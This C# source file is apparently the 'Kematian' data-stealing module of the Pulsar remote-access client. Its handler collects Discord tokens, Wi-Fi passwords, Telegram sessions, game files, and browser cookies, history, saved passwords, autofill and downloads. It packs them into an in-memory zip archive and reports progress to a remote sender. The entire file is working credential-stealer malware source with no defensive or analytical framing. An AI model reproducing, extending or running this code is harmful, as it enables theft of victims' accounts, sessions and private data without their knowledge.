using Pulsar.Client.Kematian.Browsers;
using Pulsar.Client.Kematian.Discord;
using Pulsar.Client.Kematian.Wifi;
using Pulsar.Client.Kematian.Telegram;
using Pulsar.Client.Kematian.Games;
using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using Pulsar.Common.Networking;
using Pulsar.Common.Messages;

namespace Pulsar.Client.Kematian
{
    public class Handler
    {
        public static byte[] GetData(ISender client = null)
        {
            byte[] data = null;
            
            client?.Send(new SetStatus { Message = "Kematian - Started retrieving" });
            
            using (var memoryStream = new MemoryStream())
            {
                using (var archive = new ZipArchive(memoryStream, ZipArchiveMode.Create, true))
                {
                    client?.Send(new SetStatus { Message = "Kematian - 5%" });
                    
                    var retriever = new BrowsersRetriever();
                    client?.Send(new SetStatus { Message = "Kematian - 15%" });
                    
                    var browsers = retriever.GetBrowserList();
                    client?.Send(new SetStatus { Message = "Kematian - 25%" });
                    
                    ProcessHelperModules(archive, client);
                    client?.Send(new SetStatus { Message = "Kematian - 40%" });
                    
                    ProcessBrowserData(archive, browsers, retriever, client);
                    client?.Send(new SetStatus { Message = "Kematian - 80%" });
                    
                    ProcessTelegramData(archive);
                    client?.Send(new SetStatus { Message = "Kematian - 90%" });
                    
                    ProcessGameData(archive);
                }
                data = memoryStream.ToArray();
            }
            
            client?.Send(new SetStatus { Message = "Kematian - Finished!" });
            return data;
        }
        
        private static void ProcessHelperModules(ZipArchive archive, ISender client)
        {
            var textMethods = new KeyValuePair<Func<string>, string>[]
            {
                new KeyValuePair<Func<string>, string>(GetTokens.Tokens, "Discord\\tokens.txt"),
                new KeyValuePair<Func<string>, string>(GetWifis.Passwords, "Wifi\\Wifi.txt"),
                new KeyValuePair<Func<string>, string>(TelegramRetriever.GetTelegramSessions, "Telegram\\sessions.txt")
            };

            foreach (var methodPair in textMethods)
            {
                try
                {
                    var content = methodPair.Key();
                    var zipEntry = archive.CreateEntry(methodPair.Value);
                    using (var entryStream = new BufferedStream(zipEntry.Open()))
                    using (var streamWriter = new StreamWriter(entryStream))
                    {
                        streamWriter.Write(content);
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error processing {methodPair.Value}: {ex.Message}");
                }
            }
        }
        
        private static void ProcessBrowserData(ZipArchive archive, List<BrowserInfo> browsers, BrowsersRetriever retriever, ISender client)
        {
            try
            {
                int browserCount = browsers.Count;
                int currentBrowser = 0;
                
                foreach (var browser in browsers)
                {
                    currentBrowser++;
                    int browserProgress = 40 + (currentBrowser * 40 / browserCount);
                    client?.Send(new SetStatus { Message = $"Kematian - {browserProgress}%" });
                    
                    ProcessBrowserCookies(archive, browser, retriever);
                    ProcessBrowserHistory(archive, browser, retriever);
                    ProcessBrowserPasswords(archive, browser, retriever);
                    
                    switch (browser.Type)
                    {
                        case "Chromium":
                        case "Gecko":
                            ProcessBrowserAutofill(archive, browser, retriever);
                            ProcessBrowserDownloads(archive, browser, retriever);
                            break;
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error processing browser data: {ex.Message}");
            }
        }
        
        private static void ProcessBrowserCookies(ZipArchive archive, BrowserInfo browser, BrowsersRetriever retriever)
        {
            try
            {
                var content = retriever.GetCookiesForBrowser(browser);
                if (!string.IsNullOrEmpty(content))
                {
                    var zipEntry = archive.CreateEntry($"Browsers\\{browser.Name}\\cookies_netscape.txt");
                    using (var entryStream = new BufferedStream(zipEntry.Open()))
                    using (var streamWriter = new StreamWriter(entryStream))
                    {
                        streamWriter.Write(content);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error processing cookies for {browser.Name}: {ex.Message}");
            }
        }
        
        private static void ProcessBrowserHistory(ZipArchive archive, BrowserInfo browser, BrowsersRetriever retriever)
        {
            try
            {
                var content = retriever.GetHistoryForBrowser(browser);
                if (!string.IsNullOrEmpty(content) && content != "[]")
                {
                    var zipEntry = archive.CreateEntry($"Browsers\\{browser.Name}\\history.json");
                    using (var entryStream = new BufferedStream(zipEntry.Open()))
                    using (var streamWriter = new StreamWriter(entryStream))
                    {
                        streamWriter.Write(content);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error processing history for {browser.Name}: {ex.Message}");
            }
        }
        
        private static void ProcessBrowserPasswords(ZipArchive archive, BrowserInfo browser, BrowsersRetriever retriever)
        {
            try
            {
                var content = retriever.GetPasswordsForBrowser(browser);
                if (!string.IsNullOrEmpty(content) && content != "[]")
                {
                    var zipEntry = archive.CreateEntry($"Browsers\\{browser.Name}\\passwords.json");
                    using (var entryStream = new BufferedStream(zipEntry.Open()))
                    using (var streamWriter = new StreamWriter(entryStream))
                    {
                        streamWriter.Write(content);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error processing passwords for {browser.Name}: {ex.Message}");
            }
        }
        
        private static void ProcessBrowserAutofill(ZipArchive archive, BrowserInfo browser, BrowsersRetriever retriever)
        {
            try
            {
                var content = retriever.GetAutoFillForBrowser(browser);
                if (!string.IsNullOrEmpty(content) && content != "[]")
                {
                    var zipEntry = archive.CreateEntry($"Browsers\\{browser.Name}\\autofill.json");
                    using (var entryStream = new BufferedStream(zipEntry.Open()))
                    using (var streamWriter = new StreamWriter(entryStream))
                    {
                        streamWriter.Write(content);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error processing autofill for {browser.Name}: {ex.Message}");
            }
        }
        
        private static void ProcessBrowserDownloads(ZipArchive archive, BrowserInfo browser, BrowsersRetriever retriever)
        {
            try
            {
                var content = retriever.GetDownloadsForBrowser(browser);
                if (!string.IsNullOrEmpty(content) && content != "[]")
                {
                    var zipEntry = archive.CreateEntry($"Browsers\\{browser.Name}\\downloads.json");
                    using (var entryStream = new BufferedStream(zipEntry.Open()))
                    using (var streamWriter = new StreamWriter(entryStream))
                    {
                        streamWriter.Write(content);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error processing downloads for {browser.Name}: {ex.Message}");
            }
        }
        
        private static void ProcessTelegramData(ZipArchive archive)
        {
            try
            {
                var telegramFiles = TelegramRetriever.GetTelegramSessionFiles();
                foreach (var file in telegramFiles)
                {
                    var zipEntry = archive.CreateEntry(file.Key);
                    using (var entryStream = new BufferedStream(zipEntry.Open()))
                    {
                        entryStream.Write(file.Value, 0, file.Value.Length);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error processing Telegram session files: {ex.Message}");
            }
        }
        
        private static void ProcessGameData(ZipArchive archive)
        {
            try
            {
                var gameFiles = GamesRetriever.GetGameFiles();
                foreach (var file in gameFiles)
                {
                    var zipEntry = archive.CreateEntry(file.Key);
                    using (var entryStream = new BufferedStream(zipEntry.Open()))
                    {
                        entryStream.Write(file.Value, 0, file.Value.Length);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error processing game files: {ex.Message}");
            }
        }
    }
}
